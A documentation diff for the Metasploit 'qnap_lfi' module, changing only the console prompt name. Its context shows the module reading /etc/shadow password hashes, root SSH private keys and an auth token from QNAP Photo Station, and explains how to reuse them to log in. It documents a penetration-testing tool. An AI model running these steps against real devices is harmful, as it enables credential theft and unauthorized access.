@@ -46,7 +46,7 @@ Whether to print file contents to the screen, defaults to true.
 #### Dumping hashes from `/etc/shadow`
 
 ```
-msf5 auxiliary(gather/qnap_lfi) > run
+msf auxiliary(gather/qnap_lfi) > run
 [*] Running module against [REDACTED]
 
 [*] Getting the Album Id
@@ -68,7 +68,7 @@ Merle:$1$JjtNtEJx$PMtCY0tpb2N/rjck2fHVI0:17438:0:99999:7:::
 a9d01ba7:$1$PKQtJPZZ$3RdJRQozKzdx1axJqP9Fe/:18405:0:99999:7:::
 [*] adding the /etc/shadow entries to the database
 [*] Auxiliary module execution completed
-msf5 auxiliary(gather/qnap_lfi) > loot
+msf auxiliary(gather/qnap_lfi) > loot
 
 Loot
 ====
@@ -77,7 +77,7 @@ host           service  type       name    content                   info  path
 ----           -------  ----       ----    -------                   ----  ----
 [REDACTED]              qnap.http  shadow  text/plain                      /home/redouane/.msf4/loot/20200528212705_default_[REDACTED]_qnap.http_394810.bin
 
-msf5 auxiliary(gather/qnap_lfi) > creds
+msf auxiliary(gather/qnap_lfi) > creds
 Credentials
 ===========
 
@@ -91,7 +91,7 @@ host  origin         service  public      private                             re
       [REDACTED]              Merle       $1$JjtNtEJx$PMtCY0tpb2N/rjck2fHVI0         Nonreplayable hash  md5crypt
       [REDACTED]              a9d01ba7    $1$PKQtJPZZ$3RdJRQozKzdx1axJqP9Fe/         Nonreplayable hash  md5crypt
 
-msf5 auxiliary(gather/qnap_lfi) >
+msf auxiliary(gather/qnap_lfi) >
 ```
 
 The hashes can be used to login from the web interface, or through ssh if it's enabled.
@@ -99,9 +99,9 @@ The hashes can be used to login from the web interface, or through ssh if it's e
 #### Dumping ssh private keys
 
 ```
-msf5 auxiliary(gather/qnap_lfi) > set FILEPATH /root/.ssh/id_rsa
+msf auxiliary(gather/qnap_lfi) > set FILEPATH /root/.ssh/id_rsa
 FILEPATH => /root/.ssh/id_rsa
-msf5 auxiliary(gather/qnap_lfi) > exploit
+msf auxiliary(gather/qnap_lfi) > exploit
 [*] Running module against [redacted]
 
 [*] Getting the Album Id
@@ -115,15 +115,15 @@ msf5 auxiliary(gather/qnap_lfi) > exploit
 [redacted]
 -----END RSA PRIVATE KEY-----
 [*] Auxiliary module execution completed
-msf5 auxiliary(gather/qnap_lfi) >
+msf auxiliary(gather/qnap_lfi) >
 ```
 
 #### Retrieving the token, can be used to authenticate
 
 ```
-msf5 auxiliary(gather/qnap_lfi) > set FILEPATH /share/Multimedia/.@__thumb/ps.app.token
+msf auxiliary(gather/qnap_lfi) > set FILEPATH /share/Multimedia/.@__thumb/ps.app.token
 FILEPATH => /share/Multimedia/.@__thumb/ps.app.token
-msf5 auxiliary(gather/qnap_lfi) > exploit
+msf auxiliary(gather/qnap_lfi) > exploit
 [*] Running module against [redacted]
 
 [*] Getting the Album Id
@@ -135,7 +135,7 @@ msf5 auxiliary(gather/qnap_lfi) > exploit
 [+] File content:
 [redacted]
 [*] Auxiliary module execution completed
-msf5 auxiliary(gather/qnap_lfi) >
+msf auxiliary(gather/qnap_lfi) >
 ```
 
 The token can then be used to authenticate, by sending a POST request to the uri `/cgi-bin/authLogin.cgi`, for the example above:
@@ -147,7 +147,7 @@ This would return an `authSid`, that can be used with most endpoints that requir
 ### QNAP QTS 4.3.6 with Photo Station 5.7.9
 
 ```
-msf5 auxiliary(gather/qnap_lfi) > show options
+msf auxiliary(gather/qnap_lfi) > show options
 
 Module options (auxiliary/gather/qnap_lfi):
 
@@ -171,7 +171,7 @@ Auxiliary action:
    Download  Download the file at FILEPATH
 
 
-msf5 auxiliary(gather/qnap_lfi) > run
+msf auxiliary(gather/qnap_lfi) > run
 [*] Running module against 192.168.250.5
 
 [*] Getting the Album Id
@@ -189,5 +189,5 @@ proc		/proc	       proc     defaults	  0	 0
 none            /dev/pts        devpts  gid=5,mode=620  0       0
 
 [*] Auxiliary module execution completed
-msf5 auxiliary(gather/qnap_lfi) >
+msf auxiliary(gather/qnap_lfi) >
 ```
